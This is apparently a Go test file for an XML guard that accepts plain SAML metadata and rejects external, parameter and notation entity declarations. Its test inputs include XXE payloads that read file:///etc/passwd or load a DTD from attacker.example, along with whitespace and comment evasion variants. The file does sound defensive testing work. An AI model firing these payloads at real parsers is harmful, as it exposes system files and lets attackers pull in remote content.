package netsec

import (
	"errors"
	"testing"
)

const samlMetadata = `<?xml version="1.0" encoding="UTF-8"?>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata"
                  xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
                  entityID="https://idp.example.org/idp/shibboleth">
  <IDPSSODescriptor WantAuthnRequestsSigned="true"
                     protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <KeyDescriptor use="signing">
      <ds:KeyInfo>
        <ds:X509Data>
          <ds:X509Certificate>MIIB...</ds:X509Certificate>
        </ds:X509Data>
      </ds:KeyInfo>
    </KeyDescriptor>
    <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
                         Location="https://idp.example.org/SAML2/SSO/Redirect"/>
    <!-- SYSTEM and PUBLIC are ordinary text inside the document body -->
  </IDPSSODescriptor>
</EntityDescriptor>
`

type resolveSpy struct {
	calls int
	names []string
}

func (r *resolveSpy) resolve(name string) (string, bool) {
	r.calls++
	r.names = append(r.names, name)
	return "", false
}

func TestNoDoctypePassesUntouched(t *testing.T) {
	spy := &resolveSpy{}
	guard := New(1<<20, spy.resolve)

	if err := guard.Check([]byte(samlMetadata)); err != nil {
		t.Fatalf("legitimate metadata rejected: %v", err)
	}
	if spy.calls != 0 {
		t.Fatalf("resolver invoked %d times without a DOCTYPE", spy.calls)
	}
	if got := guard.Entities(); got != nil {
		t.Fatalf("entity table should be nil without DOCTYPE, got %v", got)
	}

	variants := []string{
		"\uFEFF" + samlMetadata,
		"<!-- a comment --><root/>",
		"<?xml version=\"1.0\"?>\n<?pi target?><root/>",
		"  \n\t<root/>",
	}
	for idx, doc := range variants {
		if err := guard.Check([]byte(doc)); err != nil {
			t.Fatalf("variant %d rejected: %v", idx, err)
		}
	}
}

func TestExternalEntitiesAreRejected(t *testing.T) {
	docs := map[string]string{
		"system entity":                `<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
		"public entity":                `<!DOCTYPE root [<!ENTITY xxe PUBLIC "pubid" "file:///etc/passwd">]><root>&xxe;</root>`,
		"external subset":              `<!DOCTYPE root SYSTEM "http://attacker.example/evil.dtd"><root/>`,
		"public subset":                `<!DOCTYPE root PUBLIC "pubid" "http://attacker.example/evil.dtd"><root/>`,
		"whitespace padded":            "<!DOCTYPE root [<!ENTITY xxe\n  SYSTEM   \"file:///etc/passwd\">]><root/>",
		"tab inside declaration":       "<!DOCTYPE root [<!ENTITY\txxe\tSYSTEM\t\"file:///etc/passwd\">]><root/>",
		"comment between declarations": `<!DOCTYPE root [<!-- lead --><!ENTITY xxe SYSTEM "file:///etc/passwd">]><root/>`,
		"whitespace inside brackets":   "<!DOCTYPE root [ <!ENTITY\n  xxe\n  SYSTEM\n  \"file:///etc/passwd\" > ]><root/>",
	}
	for name, doc := range docs {
		t.Run(name, func(t *testing.T) {
			err := New(1<<20, nil).Check([]byte(doc))
			if !errors.Is(err, ErrExternalEntity) {
				t.Fatalf("want ErrExternalEntity, got %v", err)
			}
		})
	}
}

func TestUnsupportedMarkupIsRejected(t *testing.T) {
	docs := map[string]string{
		"notation": `<!DOCTYPE root [<!NOTATION note SYSTEM "note://x">]><root/>`,
	}
	for name, doc := range docs {
		t.Run(name, func(t *testing.T) {
			err := New(1<<20, nil).Check([]byte(doc))
			if !errors.Is(err, ErrUnsupportedMarkup) {
				t.Fatalf("want ErrUnsupportedMarkup, got %v", err)
			}
		})
	}
}

func TestParameterEntitiesAreRejected(t *testing.T) {
	docs := map[string]string{
		"parameter declaration":     `<!DOCTYPE root [<!ENTITY % pe "x">]><root/>`,
		"whitespace before percent": "<!DOCTYPE root [<!ENTITY\n  % pe \"x\">]><root/>",
		"percent in entity value":   `<!DOCTYPE root [<!ENTITY a "xx%yy">]><root/>`,
		"percent reference":         `<!DOCTYPE root [<!ATTLIST root attr CDATA "%pe;">]><root/>`,
	}
	for name, doc := range docs {
		t.Run(name, func(t *testing.T) {
			err := New(1<<20, nil).Check([]byte(doc))
			if !errors.Is(err, ErrParameterEntity) {
				t.Fatalf("want ErrParameterEntity, got %v", err)
			}
		})
	}
}
